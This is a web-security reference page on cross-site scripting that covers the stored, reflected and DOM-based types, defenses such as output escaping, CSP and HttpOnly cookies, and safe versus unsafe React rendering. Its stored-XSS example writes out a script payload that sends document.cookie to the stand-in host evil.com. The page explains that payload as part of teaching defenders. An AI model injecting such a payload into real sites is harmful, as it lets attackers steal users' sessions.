# XSS (Cross-Site Scripting)

XSS is a vulnerability class where an attacker gets their own JavaScript to execute in another user's browser, in the security context of a trusted site — meaning the injected script can read the page's cookies (unless `HttpOnly`), make authenticated requests, read the DOM, and generally do anything the legitimate page's own scripts could do.

## Why It's Dangerous

Unlike [CSRF](csrf.md), which can only *trigger* actions blind, a successful XSS payload runs *inside* the trusted origin — it can read responses, exfiltrate session tokens, read a [CSRF](csrf.md) token straight out of the DOM, log keystrokes, or rewrite the page entirely (e.g. a fake login form that posts credentials to the attacker).

## The Three Classic Types

| Type | How the payload gets in | Persistence |
|---|---|---|
| **Stored (persistent)** | Saved server-side (e.g. in a comment, profile bio, product review) and served back to every visitor who views that content | Persists until removed — the most dangerous type since it hits every viewer automatically |
| **Reflected** | Echoed back immediately in the response, typically from a query parameter (e.g. a search page that renders `You searched for: <script>...` from `?q=`) | Requires the victim to click a crafted link — not stored anywhere |
| **DOM-based** | The payload never touches the server at all — client-side JavaScript reads something attacker-controlled (`location.hash`, `document.referrer`) and writes it into the DOM unsafely (`innerHTML`, `eval`) | Entirely client-side; a server-side [WAF](waf.md) or output-encoding-on-the-backend won't catch it |

## A Concrete Example (Stored XSS)

A comment form saves user input directly and renders it back unescaped:

```html
<!-- Attacker submits this as a "comment" -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

```html
<!-- Page renders it back to every visitor, verbatim -->
<div class="comment"><script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script></div>
```

Every visitor's browser executes that script, in the vulnerable site's own origin, sending their cookie to the attacker.

## Root Cause: Untrusted Data Rendered as Code

XSS happens whenever attacker-controlled input is inserted into a page in a context where the browser interprets it as executable code or markup instead of inert text — an HTML body, an attribute, a `<script>` block, or a URL.

## Defenses

| Defense | What it does |
|---|---|
| **Output encoding/escaping** | Convert `<`, `>`, `&`, `"`, `'` to their HTML entity equivalents before rendering user input as text — turns a `<script>` tag into inert text `&lt;script&gt;` instead of executable markup |
| **Context-aware escaping** | The correct escaping differs by context — HTML body, HTML attribute, JavaScript string, URL — using the wrong one still leaves a hole |
| **Modern frameworks' default escaping** | React (`{value}`), Vue, and [Angular](../../frontend/angular.md) all escape interpolated values by default — XSS in these frameworks almost always comes from deliberately bypassing the default (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`) |
| **[Content-Security-Policy](content-security-policy.md)** | A `script-src` policy blocks inline/unauthorized scripts from executing even if one gets injected — defense-in-depth for when output encoding fails somewhere |
| **`HttpOnly` cookies** | Marks a cookie as inaccessible to JavaScript (`document.cookie` won't return it) — doesn't prevent XSS, but limits what a successful payload can steal |
| **Input validation/sanitization** | Reject or strip dangerous patterns on input — a secondary layer, since validation alone is easy to bypass with encoding tricks; output encoding is the reliable primary defense |
| **Sanitizing HTML that must render as HTML** | When you genuinely need to render user-supplied HTML (rich text editors), run it through a dedicated sanitizer library (e.g. DOMPurify) that strips dangerous tags/attributes rather than hand-rolling a blocklist |

## Example: Safe vs. Unsafe Rendering (React)

```jsx
// Safe — React escapes {comment} automatically
<div>{comment}</div>

// Unsafe — explicitly opts out of escaping
<div dangerouslySetInnerHTML={{ __html: comment }} />
```

The unsafe version is exactly how XSS re-enters a framework that protects against it by default — reach for it only after sanitizing the HTML with a dedicated library, never with raw user input.

## Common Questions

**Can XSS happen even with a backend that never touches a database (a purely client-rendered SPA)?**
> Yes — DOM-based XSS requires no server round-trip at all. If client-side code reads `window.location.hash` or a URL parameter and writes it into the DOM via `innerHTML` without escaping, that's a fully client-side vulnerability.

**Does `HttpOnly` fully solve the cookie-theft risk from XSS?**
> No — it stops the specific `document.cookie` read, but a successful XSS payload can still make authenticated requests on the victim's behalf (the browser attaches the `HttpOnly` cookie to `fetch` calls automatically), read the page's data, or install a keylogger. `HttpOnly` reduces the blast radius; it doesn't neutralize XSS.

**Is escaping user input on the way in ("sanitize on input") enough?**
> Not reliably — the same string might need different escaping depending on where it's later rendered (HTML body vs. a JS string vs. a URL), and sanitizing too aggressively on input can corrupt legitimate data. The standard guidance is: store data as-is, escape it correctly for the specific context at the point of output.

## Related

- [Content-Security-Policy (CSP)](content-security-policy.md)
- [CSRF](csrf.md)
- [SQL Injection](sql-injection.md)
- [postMessage & Cross-Origin Communication](../../frontend/postmessage-cross-origin.md)
